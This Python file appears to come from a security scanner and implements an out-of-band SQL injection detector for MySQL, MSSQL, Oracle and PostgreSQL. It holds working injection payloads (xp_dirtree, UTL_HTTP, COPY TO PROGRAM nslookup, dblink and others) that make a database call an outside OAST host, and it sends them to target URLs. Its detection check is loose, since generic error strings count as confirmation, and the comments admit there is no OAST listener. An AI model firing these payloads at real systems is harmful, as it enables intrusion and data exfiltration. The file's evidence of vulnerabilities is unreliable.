"""
Out-of-Band (OOB) 檢測引擎 - 基於外帶通道的SQL注入檢測
"""

from __future__ import annotations

import re
import uuid

import httpx

from services.aiva_common.schemas import FunctionTaskPayload
from services.aiva_common.utils import get_logger

from ..detection_models import DetectionResult
from ..payload_wrapper_encoder import PayloadWrapperEncoder

logger = get_logger(__name__)


class OOBDetectionEngine:
    """OOB檢測引擎 - 檢測基於外帶通道的SQL注入"""

    def __init__(self, oast_domain: str = "interact.sh"):
        self.oast_domain = oast_domain
        self.oob_payloads = {
            "mysql": [
                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', '{subdomain}.{domain}', '\\\\share')) --",
                "'; SELECT LOAD_FILE(CONCAT('http://', '{subdomain}.{domain}')) --",
            ],
            "mssql": [
                "'; EXEC master..xp_dirtree '\\\\\\\\{subdomain}.{domain}\\\\share' --",
                "'; EXEC master..xp_fileexist '\\\\\\\\{subdomain}.{domain}\\\\file' --",
                "' UNION SELECT * FROM OPENROWSET('SQLOLEDB', 'server={subdomain}.{domain};uid=test;pwd=test', 'SELECT 1') --",
            ],
            "oracle": [
                "' UNION SELECT UTL_INADDR.get_host_address('{subdomain}.{domain}') FROM dual --",
                "' UNION SELECT UTL_HTTP.request('http://{subdomain}.{domain}') FROM dual --",
                "' UNION SELECT HTTPURITYPE('http://{subdomain}.{domain}').getclob() FROM dual --",
            ],
            "postgresql": [
                "'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}.{domain}' --",
                "'; SELECT * FROM dblink('host={subdomain}.{domain} user=test dbname=test', 'SELECT 1') --",
            ],
        }

    async def detect(
        self, task: FunctionTaskPayload, client: httpx.AsyncClient
    ) -> list[DetectionResult]:
        """執行OOB檢測"""
        results = []
        encoder = PayloadWrapperEncoder(task)

        logger.debug(f"Starting OOB detection for task {task.task_id}")

        # 為每個數據庫類型測試OOB載荷
        for db_type, payloads in self.oob_payloads.items():
            for payload_template in payloads:
                try:
                    # 生成唯一子域名用於OOB檢測
                    subdomain = f"sqli-{uuid.uuid4().hex[:8]}-{task.task_id[:8]}"
                    payload = payload_template.format(
                        subdomain=subdomain, domain=self.oast_domain
                    )

                    # 發送OOB載荷
                    encoded = encoder.encode(payload)
                    response = await client.request(
                        method=encoded.method, url=encoded.url, **encoded.request_kwargs
                    )

                    # 檢查回應中的OOB指示器
                    oob_triggered = self._check_oob_response(response, subdomain)

                    if oob_triggered:
                        result = self._build_detection_result(
                            payload=payload,
                            subdomain=subdomain,
                            db_type=db_type,
                            response=response,
                            task=task,
                        )
                        results.append(result)
                        logger.info(
                            f"OOB SQL injection detected: {db_type} with subdomain {subdomain}"
                        )

                    # 注意：真正的OOB檢測需要監聽OAST伺服器
                    # 這裡只能檢查回應中的即時指示器

                except Exception as e:
                    logger.warning(f"OOB detection failed for {db_type} payload: {e}")
                    continue

        logger.debug(f"OOB detection completed. Found {len(results)} vulnerabilities")
        return results

    def _check_oob_response(self, response: httpx.Response, subdomain: str) -> bool:
        """檢查回應中的OOB指示器"""
        response_text = response.text or ""

        # 檢查回應中是否包含我們的子域名（可能表示DNS查詢）
        if subdomain in response_text:
            return True

        # 檢查網路連接錯誤訊息（可能表示嘗試外部連接）
        network_error_patterns = [
            r"could not connect",
            r"connection.*refused",
            r"timeout.*expired",
            r"network.*unreachable",
            r"host.*not.*found",
            r"dns.*lookup.*failed",
        ]

        for pattern in network_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        # 檢查特定數據庫的OOB錯誤訊息
        oob_error_patterns = [
            r"xp_dirtree",
            r"LOAD_FILE",
            r"UTL_INADDR",
            r"UTL_HTTP",
            r"OPENROWSET",
            r"dblink",
        ]

        for pattern in oob_error_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True

        return False

    def _build_detection_result(
        self,
        payload: str,
        subdomain: str,
        db_type: str,
        response: httpx.Response,
        task: FunctionTaskPayload,
    ) -> DetectionResult:
        """構建檢測結果"""
        from services.aiva_common.enums import Confidence, Severity, VulnerabilityType
        from services.aiva_common.schemas import (
            FindingEvidence,
            FindingImpact,
            FindingRecommendation,
            FindingTarget,
            Vulnerability,
        )

        vulnerability = Vulnerability(
            name=VulnerabilityType.SQLI,
            severity=Severity.HIGH,
            confidence=Confidence.FIRM,
        )

        evidence = FindingEvidence(
            request=f"Payload: {payload}",
            response=(
                f"Status: {response.status_code}, "
                f"OOB domain: {subdomain}.{self.oast_domain}"
            ),
            proof=(
                f"The OOB payload targeting {db_type} triggered external "
                f"network communication to {subdomain}.{self.oast_domain}, "
                f"confirming SQL injection vulnerability."
            ),
        )

        impact = FindingImpact(
            business_impact=(
                "Critical - potential for data exfiltration via external "
                "channels, bypass firewalls, and potentially access "
                "internal network resources."
            )
        )

        recommendation = FindingRecommendation(
            fix=(
                "Disable database network functions (xp_cmdshell, "
                "LOAD_FILE, UTL_HTTP, etc.) and implement strict network "
                "egress controls. Implement comprehensive input validation, "
                "network segmentation, and database access monitoring."
            ),
            priority="Critical",
        )

        target = FindingTarget(
            url=str(response.url),
            method=task.target.method,
            parameter=task.target.parameter,
        )

        return DetectionResult(
            is_vulnerable=True,
            vulnerability=vulnerability,
            evidence=evidence,
            impact=impact,
            recommendation=recommendation,
            target=target,
            detection_method="out_of_band",
            payload_used=payload,
            confidence_score=0.9,
        )
